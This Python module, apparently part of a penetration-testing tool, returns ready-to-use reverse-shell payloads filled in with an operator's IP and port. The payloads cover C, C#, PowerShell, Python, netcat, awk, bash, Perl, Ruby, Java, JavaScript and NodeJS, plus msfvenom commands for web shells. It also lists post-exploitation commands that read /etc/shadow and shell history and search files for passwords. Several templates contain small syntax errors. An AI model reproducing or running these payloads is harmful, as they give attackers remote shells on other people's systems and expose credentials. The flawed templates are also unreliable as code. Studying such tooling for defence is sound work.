
def windowsC(dicRevShellVars):

    # Windows C reverse shell code
    windowsC = '''#include <winsock2.h>
    #include <stdio.h>
    #pragma comment(lib,"ws2_32")

    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in hax; 
    char ip_addr[16] = ''' + dicRevShellVars['MyIP'] + '''; 
    char port[6] = ''' + dicRevShellVars['Local Port'] + ''';            

    STARTUPINFO ini_processo;

    PROCESS_INFORMATION processo_info;

    int main()
    {
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


        struct hostent *host; 
        host = gethostbyname(ip_addr);
        strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

        hax.sin_family = AF_INET;
        hax.sin_port = htons(atoi(port));
        hax.sin_addr.s_addr = inet_addr(ip_addr);

        WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

        memset(&ini_processo, 0, sizeof(ini_processo));
        ini_processo.cb = sizeof(ini_processo);
        ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

        TCHAR cmd[255] = TEXT("cmd.exe");

        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

        return 0;
    }
    '''

    return windowsC


def windowsCSharp(dicRevShellVars):

    # Windows C sharp reverse shell code
    windowsCSharp = '''using System;
    using System.Text;
    using System.IO;
    using System.Diagnostics;
    using System.ComponentModel;
    using System.Linq;
    using System.Net;
    using System.Net.Sockets;


    namespace ConnectBack
    {
        public class Program
        {
            static StreamWriter streamWriter;

            public static void Main(string[] args)
            {
                using(TcpClient client = new TcpClient(''' + dicRevShellVars['MyIP'] + ''', ''' + dicRevShellVars['Local Port'] + '''))
                {
                    using(Stream stream = client.GetStream())
                    {
                        using(StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);
                            
                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "bash";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while(true)
                            {
                                strInput.Append(rdr.ReadLine());
                                //strInput.Append("\n");
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }

            private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {
                StringBuilder strOutput = new StringBuilder();

                if (!String.IsNullOrEmpty(outLine.Data))
                {
                    try
                    {
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                    }
                    catch (Exception err) { }
                }
            }

        }
    }                
    '''

    return windowsCSharp


def windowsnc(dicRevShellVars):
    # Windows nc.exe reverse shell code
    windowsnc =  "nc.exe " + dicRevShellVars['MyIP'] + " " + dicRevShellVars['Local Port'] + " -e bash"


    return windowsnc


def windowsPS_1(dicRevShellVars):
    # Windows powershell reverse shell code
    windowsPS_1 =  '''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("''' + dicRevShellVars['MyIP'] + '''",''' + dicRevShellVars['Local Port'] + ''');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'''

    return windowsPS_1


def windowsPython(dicRevShellVars):
    # Windows python reverse shell code
    windowsPython = '''import os,socket,subprocess,threading;
    def s2p(s, p):
        while True:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()

    def p2s(s, p):
        while True:
            s.send(p.stdout.read(1))

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("''' + dicRevShellVars['MyIP'] + '''",''' + dicRevShellVars['Local Port'] + '''))

    p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()'''
    
    return windowsPython


def unixAwk(dicRevShellVars):
    # Unix awk reverse shell code
    unixAwk = '''awk 'BEGIN {s = "/inet/tcp/0/''' +  dicRevShellVars['MyIP'] +'''/ ''' + dicRevShellVars['Local Port'] + '''"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null'''

    return unixAwk


def unixBash(dicRevShellVars):
    # Unix bash reverse shell code
    unixBash = '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|nc ''' + dicRevShellVars['MyIP'] + " " + dicRevShellVars['Local Port'] + ''' >/tmp/f'''

    return unixBash

def unixnc(dicRevShellVars):
    # Unix nc reverse shell code
    unixnc = '''nc ''' + dicRevShellVars['MyIP'] + " " + dicRevShellVars['Local Port']

    return unixnc

def unixPerl(dicRevShellVars):
    # Unix perl reverse shell code
    unixPerl = '''perl -e 'use Socket;$i="''' + dicRevShellVars['MyIP'] + '''";$p=''' + dicRevShellVars['Local Port'] + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'''

    return unixPerl

def unixPython(dicRevShellVars):
    # Unix python reverse shell code
    unixPython = '''export RHOST="''' + dicRevShellVars['MyIP'] + '''";export RPORT=''' + dicRevShellVars['Local Port'] + ''';python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'''

    return unixPython

def unixRuby(dicRevShellVars):
    # Unix ruby reverse shell code
    unixRuby = '''ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("''' + dicRevShellVars['MyIP'] + '''",''' + dicRevShellVars['Local Port'] + '''))'''

    return unixRuby

def webASP(dicRevShellVars):
    # Web ASP reverse shell code
    webASP = '''msfvenom -p windows/shell_reverse_tcp LHOST=''' + dicRevShellVars['MyIP'] +  ''' LPORT=''' + dicRevShellVars['Local Port'] + '''-f asp > reverse.asp'''

    return webASP

def webASPX(dicRevShellVars):
    # Web ASPX reverse shell code
    webASPX = '''msfvenom -p windows/shell_reverse_tcp LHOST=''' + dicRevShellVars['MyIP'] +  ''' LPORT=''' + dicRevShellVars['Local Port'] + '''-f aspx > reverse.aspx'''

    return webASPX

def webJava(dicRevShellVars):
    # Web Java reverse shell code
    webJava = '''
    public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/''' + dicRevShellVars['MyIP'] + '''/''' + dicRevShellVars['Local Port'] + '''1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}'''
    return webJava

def webJavaScript(dicRevShellVars):
    # Web JavaScript reverse shell code
    webJavaScript = '''String command = "var host = ''' + dicRevShellVars['MyIP'] + '''';" +
                       "var port = ''' + dicRevShellVars['Local Port'] + ''';" +
                       "var cmd = 'cmd';"+
                       "var s = new java.net.Socket(host, port);" +
                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                       "var po = p.getOutputStream(), so = s.getOutputStream();"+
                       "print ('Connected');"+
                       "while (!s.isClosed()) {"+
                       "    while (pi.available() > 0)"+
                       "        so.write(pi.read());"+
                       "    while (pe.available() > 0)"+
                       "        so.write(pe.read());"+
                       "    while (si.available() > 0)"+
                       "        po.write(si.read());"+
                       "    so.flush();"+
                       "    po.flush();"+
                       "    java.lang.Thread.sleep(50);"+
                       "    try {"+
                       "        p.exitValue();"+
                       "        break;"+
                       "    }"+
                       "    catch (e) {"+
                       "    }"+
                       "}"+
                       "p.destroy();"+
                       "s.close();";
String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
ref.add(new StringRefAddr("x", x);
    '''
    return webJavaScript

def webJSP(dicRevShellVars):
    # Web JSP reverse shell code
    webJSP = '''msfvenom -p java/jsp_shell_reverse_tcp LHOST=''' + dicRevShellVars['MyIP'] +  ''' LPORT=''' + dicRevShellVars['Local Port'] + '''-f raw > reverse.jsp'''

    return webJSP

def webWar(dicRevShellVars):
    # Web War reverse shell code
    webWar = '''msfvenom -p java/jsp_shell_reverse_tcp LHOST=''' + dicRevShellVars['MyIP'] +  ''' LPORT=''' + dicRevShellVars['Local Port'] + '''-f war > reverse.war'''

    return webWar

def webNodeJS(dicRevShellVars):
    # Web NodeJS reverse shell code
    webNodeJS = '''echo "require('child_process').exec('bash -c \\'bash -i >& /dev/tcp/''' + dicRevShellVars['MyIP'] + '''/ + ''' + dicRevShellVars['Local Port'] + ''' 0>&1\\''" > /var/www/node/package.js'''

    return webNodeJS

def webPHP(dicRevShellVars):
    # Web PHP reverse shell code
    webPHP = '''msfvenom -p php/reverse_tcp LHOST=''' + dicRevShellVars['MyIP'] +  ''' LPORT=''' + dicRevShellVars['Local Port'] + '''-f war > reverse.php'''

    return webPHP


def windowsUser():
    command = ["echo %USERPROFILE%", "whoami /priv", "whoami /groups", "net user", "net localgroup", "hostname"]

    return command

def windowsNetwork():
    command = ["ipconfig /all", "arp -a", "route print", "netstat -ano"]

    return command


def windowsSystem():
    command = ["systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'System Type'", "wmic qfe", "driverquery /v", "tasklist /SVC", "wmic service get name,displayname,pathname,startmode", "wmic product get name,version,vendor", "wmic qfe get Caption,Description,HotFixID,InstalledOn", "wmic service get name,displayname,pathname,startmode 2>nul |findstr /i 'Auto' 2>nul |findstr /i /v 'C:\Windows\\' 2>nul |findstr /i /v '''", "icacls 'C:\Program Files\*' 2>nul | findstr '(F)' | findstr 'Everyone'", "mountvol", "wmic logicaldisk get caption", "findstr /si password *.txt *.ini *.xml *.config", "findstr /si password *.txt *.ini *.xml *.config", "findstr /spin 'password' *.*", "sc query windefend", "sc queryex type=service", "netsh advfirewall firewall dump", "netsh firewall show state", "netsh firewall show config"]

    return command

def linuxUser():
    command = ["whoami", "history", "cat ~/.bash_history", "id", "sudo -l", "sudo su -", "sudo -s", "cat /etc/passwd && echo '' && ls -lah /etc/passwd", "cat /etc/passwd | grep -v 'nologin' | grep -v 'false'", "cat /etc/shadow", "cat /etc/group", "ls /home"]

    return command

def linuxNetwork():
    command = ["ifconfig", "ip a", "route", "ip route", "arp -a", "ip neigh", "netstat -tulpn", "netstat -ano"]

    return command


def linuxSystem():
    command = ["history | grep pass", "env", "uname -a", "cat /proc/version", "cat /etc/issue", "lscpu", "ps aux", "ps aux | grep root", "cat/etc/fstab", "lsblk", "lsmod"]
    return command